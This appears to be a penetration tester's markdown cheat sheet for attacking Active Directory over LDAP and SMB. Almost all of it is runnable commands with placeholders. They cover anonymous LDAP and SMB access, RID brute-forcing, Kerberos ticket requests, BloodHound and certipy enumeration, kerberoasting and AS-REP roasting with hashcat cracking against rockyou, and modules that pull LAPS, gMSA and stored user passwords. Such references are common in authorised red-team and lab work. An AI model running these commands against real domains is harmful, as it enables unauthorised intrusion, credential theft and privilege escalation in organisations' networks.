# LDAP
#target/remote #os/linux #cat/ad #proto/ldap #port/389

## LDAP anonymous bind
```
nxc ldap <ip> -u '' -p ''
```

## SMB guest/anonymous access
```
nxc smb <ip> -u 'a' -p '' --shares --rid-brute 10000

nxc smb <ip> -u '' -p '' --shares --rid-brute 10000
```

## LDAP all in one
#faketime
```
getTGT.py <domain>/'<user>'<impacket_auth> && export KRB5CCNAME=$(pwd)/'<user>'.ccache

bloodyAD --host <fqdn> -d <domain> -u '<user>' -k get writable --partition DOMAIN

rusthound-ce -z -c All -d <domain> -u '<user>' -k -f <fqdn> -i <dc_ip>

certipy find -vulnerable -u '<user>'@<domain> -k -target <fqdn> -dc-ip <dc_ip> -stdout -timeout 2 -ldap-scheme ldap

nxc ldap <ip> --use-kcache --kerberoasting hashes.kerberoast --find-delegation --trusted-for-delegation --password-not-required --admin-count --pso --pass-pol --gmsa

nxc ldap <ip> --use-kcache -M adcs -M badsuccessor -M dns-nonsecure -M dump-computers -M entra-id -M get-network -M get-scriptpath -M maq -M obsolete -M sccm -M subnets -M tombstone -M whoami

nxc ldap <ip> --use-kcache -M get-desc-users -M get-info-users -M get-unixUserPassword -M get-userPassword -M laps -M pre2k

GetNPUsers.py -request -outputfile hashes.asreproast <domain>/'<user>' -k -no-pass -dc-host <fqdn>

sh -c '[ -s hashes.asreproast ] && hashcat --runtime 30 hashes.asreproast /usr/share/wordlists/rockyou.txt --force --quiet'

sh -c '[ -s hashes.kerberoast ] && hashcat --runtime 30 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force --quiet'

powerview <domain>/'<user>'@<dc_fqdn> -k --no-pass
```

## rusthound-ce
```
rusthound-ce -z -c All -d <domain> -u '<user>' <auth> -f <fqdn> -i <dc_ip>

env -u FAKETIME -u LD_PRELOAD bloodhound-ce-ctl -u <bh_url|http://127.0.0.1:8080> -z $(ls -t *_rusthound-ce.zip | head -1) -c -p > bloodhound-ce-ctl.log 2>&1 &
```

## bloodhound-ce-ctl
```
env -u FAKETIME -u LD_PRELOAD bloodhound-ce-ctl -u <bh_url|http://127.0.0.1:8080> -z <bh_zip> -c -p
```

## PowerView connect
```
powerview <domain>/'<user>'<auth> --no-cache
```

## Powerview anonymous connect
```
powerview <fqdn> --no-cache
```

## godap connect
```
godap <fqdn> -u '<user>' -d <domain> <auth> -t 'ldap/<fqdn>'
```
